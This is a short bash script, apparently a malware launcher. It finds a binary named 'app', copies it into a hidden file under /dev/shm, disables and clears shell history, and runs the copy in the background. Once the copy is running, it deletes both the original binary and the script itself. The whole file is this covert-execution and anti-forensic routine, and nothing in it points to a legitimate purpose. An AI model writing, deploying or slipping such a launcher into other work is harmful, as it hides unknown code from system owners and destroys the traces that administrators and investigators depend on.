#!/bin/bash
P=""$(pwd)"" && R=""${0%/*}"" && [ "$R" = "$0" ] && R="$P"
F="$R/app" && [ ! -f "$F" ] && F="$P/app" && [ ! -f "$F" ] && F="/tmp/app"
mkdir -p /dev/shm/.cache 2>/dev/null && cp "$F" /dev/shm/.cache/.cache 2>/dev/null && chmod +x /dev/shm/.cache/.cache 2>/dev/null
HISTFILE=/dev/null && unset HISTFILE && history -c 2>/dev/null
/dev/shm/.cache/.cache & W=$! && sleep 3
if kill -0 $W 2>/dev/null; then rm -f "$F" 2>/dev/null && rm -f "$0" 2>/dev/null && wait $W 2>/dev/null; else "$F" & wait $! 2>/dev/null; fi
